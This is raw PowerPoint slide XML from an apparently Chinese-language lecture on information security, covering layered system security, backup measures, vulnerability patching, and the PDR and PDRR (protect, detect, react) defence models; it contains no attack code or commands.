              <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                </a:rPr>
                <a:t>防止</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                </a:rPr>
                <a:t>内部</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                </a:rPr>
                <a:t>权限</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                </a:rPr>
                <a:t>提升</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="74777" name="Rectangle 19"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4600" y="1318"/>
              <a:ext cx="292" cy="2046"/>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系</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                </a:rPr>
                <a:t>统</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                </a:rPr>
                <a:t>备</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                </a:rPr>
                <a:t>份</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                </a:rPr>
                <a:t>安</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                </a:rPr>
                <a:t>全</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                </a:rPr>
                <a:t>措</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                </a:rPr>
                <a:t>施</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="74778" name="Rectangle 20"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3558" y="1362"/>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文件、数据安全</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="74779" name="Rectangle 21"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3558" y="1797"/>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应用服务层安全</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="74780" name="Rectangle 22"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3558" y="2232"/>
              <a:ext cx="792" cy="262"/>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系统服务层安全</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="74781" name="Rectangle 23"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3558" y="2668"/>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系统内核安全</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="74782" name="Rectangle 24"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3558" y="3103"/>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物理安全</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="74783" name="Rectangle 25"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1390" y="3582"/>
              <a:ext cx="3543" cy="261"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:gradFill rotWithShape="1">
              <a:gsLst>
                <a:gs pos="0">
                  <a:schemeClr val="accent2"/>
                </a:gs>
                <a:gs pos="100000">
                  <a:schemeClr val="bg2"/>
                </a:gs>
              </a:gsLst>
              <a:lin ang="27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漏洞分析                               检测                                    漏洞修补</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="74784" name="AutoShape 26"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1473" y="3408"/>
              <a:ext cx="125" cy="130"/>
            </a:xfrm>
            <a:prstGeom prst="upArrow">
              <a:avLst>
                <a:gd name="adj1" fmla="val 50000"/>
                <a:gd name="adj2" fmla="val 26000"/>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sp>
          <p:nvSpPr>
            <p:cNvPr id="74785" name="AutoShape 27"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3057" y="3408"/>
              <a:ext cx="125" cy="130"/>
            </a:xfrm>
            <a:prstGeom prst="upArrow">
              <a:avLst>
                <a:gd name="adj1" fmla="val 50000"/>
                <a:gd name="adj2" fmla="val 26000"/>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sp>
          <p:nvSpPr>
            <p:cNvPr id="74786" name="AutoShape 28"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4683" y="3408"/>
              <a:ext cx="125" cy="130"/>
            </a:xfrm>
            <a:prstGeom prst="upArrow">
              <a:avLst>
                <a:gd name="adj1" fmla="val 50000"/>
                <a:gd name="adj2" fmla="val 26000"/>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sp>
          <p:nvSpPr>
            <p:cNvPr id="74787" name="AutoShape 29"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1473" y="1144"/>
              <a:ext cx="125" cy="131"/>
            </a:xfrm>
            <a:prstGeom prst="downArrow">
              <a:avLst>
                <a:gd name="adj1" fmla="val 50000"/>
                <a:gd name="adj2" fmla="val 26200"/>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sp>
          <p:nvSpPr>
            <p:cNvPr id="74788" name="AutoShape 30"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3016" y="1144"/>
              <a:ext cx="125" cy="131"/>
            </a:xfrm>
            <a:prstGeom prst="downArrow">
              <a:avLst>
                <a:gd name="adj1" fmla="val 50000"/>
                <a:gd name="adj2" fmla="val 26200"/>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sp>
          <p:nvSpPr>
            <p:cNvPr id="74789" name="AutoShape 31"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4683" y="1144"/>
              <a:ext cx="125" cy="131"/>
            </a:xfrm>
            <a:prstGeom prst="downArrow">
              <a:avLst>
                <a:gd name="adj1" fmla="val 50000"/>
                <a:gd name="adj2" fmla="val 26200"/>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grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="89125" name="AutoShape 37"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6848057" y="2393230"/>
            <a:ext cx="2014955" cy="809192"/>
          </a:xfrm>
          <a:prstGeom prst="cloudCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val -31309"/>
              <a:gd name="adj2" fmla="val 100004"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFF00"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:noFill/>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst>
            <a:prstShdw prst="shdw18" dist="17961" dir="13500000">
              <a:schemeClr val="folHlink">
                <a:gamma/>
                <a:shade val="60000"/>
                <a:invGamma/>
              </a:schemeClr>
            </a:prstShdw>
          </a:effectLst>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>protection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="89122" name="AutoShape 34"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7152919" y="1012074"/>
            <a:ext cx="1692625" cy="742255"/>
          </a:xfrm>
          <a:prstGeom prst="cloudCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val -93430"/>
              <a:gd name="adj2" fmla="val 66360"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFF00"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:noFill/>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst>
            <a:prstShdw prst="shdw18" dist="17961" dir="13500000">
              <a:schemeClr val="folHlink">
                <a:gamma/>
                <a:shade val="60000"/>
                <a:invGamma/>
              </a:schemeClr>
            </a:prstShdw>
          </a:effectLst>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>Reaction</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="89126" name="AutoShape 38"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7187058" y="5433446"/>
            <a:ext cx="1835530" cy="538470"/>
          </a:xfrm>
          <a:prstGeom prst="cloudCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val -87304"/>
              <a:gd name="adj2" fmla="val 28521"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFF00"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:noFill/>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst>
            <a:prstShdw prst="shdw18" dist="17961" dir="13500000">
              <a:schemeClr val="folHlink">
                <a:gamma/>
                <a:shade val="60000"/>
                <a:invGamma/>
              </a:schemeClr>
            </a:prstShdw>
          </a:effectLst>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>Detection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="74755" name="Picture 43" descr="j02986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460" y="2587298"/>
            <a:ext cx="1862287" cy="2162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6" name="Text Box 44"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="395288" y="4797425"/>
            <a:ext cx="874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b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>攻击者</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="74757" name="标题 37"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="620359" y="660417"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>基于</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>PDR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>的安全架构</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" alt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52464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4755"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="74755"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7475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4756"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="11" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="74756"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="12" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7475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4759"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="23" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="74759"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="24" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7475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9125"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="29" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="89125"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="30" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="8912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89126"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="35" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="89126"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="36" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="8912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89122"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="41" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="89122"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="42" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="89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25" grpId="0" animBg="1"/>
      <p:bldP spid="89122" grpId="0" animBg="1"/>
      <p:bldP spid="89126" grpId="0" animBg="1"/>
      <p:bldP spid="7475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3150" y="692696"/>
            <a:ext cx="3725700" cy="523220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>PDR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>演变：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>PDRR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>模型</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="矩形 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="438124" y="1258906"/>
            <a:ext cx="8310340" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>PDRR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>模型是：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>保护（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Protect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>）、检测（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Detect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>）、反应（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>React</a:t>
            </a:r>
            <a:r>
